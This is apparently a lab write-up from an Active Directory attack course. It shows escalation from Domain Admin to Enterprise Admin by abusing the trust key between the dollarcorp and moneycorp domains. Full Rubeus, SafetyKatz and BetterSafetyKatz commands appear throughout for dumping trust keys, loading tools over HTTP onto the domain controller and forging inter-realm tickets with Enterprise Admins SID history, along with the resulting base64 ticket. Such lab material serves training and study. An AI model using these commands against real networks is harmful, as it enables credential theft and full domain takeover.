# ⚡ Using DA access to escalate to EA or DA to the parent domain using the domain trust key

We need the trust key for the trust between dollarcorp and moneycrop, which can be retrieved using Mimikatz or SafetyKatz.

Let's start by running a process with DA privileges ->

encode "asktgt" wuth Argsplit,&#x20;

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

<figure><img src="../../.gitbook/assets/image (1133).png" alt=""><figcaption></figcaption></figure>

Now we need to copy Loader.exe on dcorp-dc and use it to extract credentials ->

```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
winrs -r:dcorp-dc cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.13
```

<figure><img src="../../.gitbook/assets/image (1134).png" alt=""><figcaption></figcaption></figure>

Now encode "lsadump::trust" and add it to the DA process ->

<figure><img src="../../.gitbook/assets/image (1135).png" alt=""><figcaption></figcaption></figure>

```
C:\Users\Public\Loader.exe -path http://172.16.100.13:8787/SafetyKatz.exe -args "%Pwn% /patch" "exit"
```

<figure><img src="../../.gitbook/assets/image (1136).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1138).png" alt=""><figcaption><p>58d075ffe9bf3d0fbc556c4855c30d7b</p></figcaption></figure>

This output shows the trust relationship information between the `DOLLARCORP.MONEYCORP.LOCAL` domain and the `MONEYCORP.LOCAL` domain.

#### Purpose of Retrieving This Information

Understanding and extracting trust relationships and cryptographic keys between Active Directory domains are critical for several reasons:

1. **Privilege Escalation**:
   * Trust relationships can be leveraged by attackers to escalate privileges from a lower-trust domain to a higher-trust domain. For example, if an attacker compromises a machine in the `DOLLARCORP` domain, understanding the trust relationship with `MONEYCORP` can help them move laterally and gain access to resources in `MONEYCORP`.
2. **Lateral Movement**:
   * By understanding the trust relationships, attackers can plan their lateral movement strategies more effectively. They can identify which domains trust each other and how they can pivot from one domain to another.
3. **Persistence**:
   * Extracting cryptographic keys and other sensitive information helps attackers maintain persistence within a network. They can use this information to decrypt traffic, forge tickets (e.g., Kerberos tickets), and continue accessing resources even if some credentials are reset.

Now that we got rc4, on our Student VM, let's encode silver and run the follwoing command:

<figure><img src="../../.gitbook/assets/image (1139).png" alt=""><figcaption></figcaption></figure>

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:58d075ffe9bf3d0fbc556c4855c30d7b /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
```

<figure><img src="../../.gitbook/assets/image (1140).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1141).png" alt=""><figcaption></figcaption></figure>

**Service Principal Name (SPN)**:

* `/service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL`
* Indicates the target service for which the Kerberos ticket is being requested. `krbtgt` is the service principal name for the Key Distribution Center (KDC) in the domain `DOLLARCORP.MONEYCORP.LOCAL`.

**LDAP Enumeration**:

* `/ldap`
* Requests that Rubeus perform an LDAP query to retrieve additional information about the account, such as user attributes.

**Target User**:

* `/user:Administrator`
* Specifies the target user for whom the ticket is being requested. In this case, it is the `Administrator` account.

**Output Formatting**:

* `/nowrap`
* Ensures that the output ticket is displayed as a single, continuous Base64 string without line breaks.

The command aims to generate a Kerberos ticket for the `Administrator` user in the `DOLLARCORP.MONEYCORP.LOCAL` domain using the provided RC4 hash for the `krbtgt` account. The use of the `Enterprise Admins` SID (`-519`) implies that the resulting ticket will grant significant privileges, potentially allowing complete control over the Active Directory environment

base64 ticket:

```
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
```

In the context of Kerberos tickets and the command provided, Base64 encoding is used to represent the binary data of a Kerberos ticket in a text format that can be easily copied, transferred, and used in scripts or commands.

Now we can use this ticket for the follwoing command, don't forget to encode "asktgs"

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket: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 
```

<figure><img src="../../.gitbook/assets/image (1142).png" alt=""><figcaption></figcaption></figure>

We can now connect to the mcorp-dc:

<figure><img src="../../.gitbook/assets/image (1143).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1144).png" alt=""><figcaption></figcaption></figure>

Now let's try using BetterSafetyKatz

let's start by forging a ticket with SID History of Enterprise Admins:

```
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4:58d075ffe9bf3d0fbc556c4855c30d7b /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"
```

<figure><img src="../../.gitbook/assets/image (1145).png" alt=""><figcaption></figcaption></figure>

Now we can use the ticket with rubeus
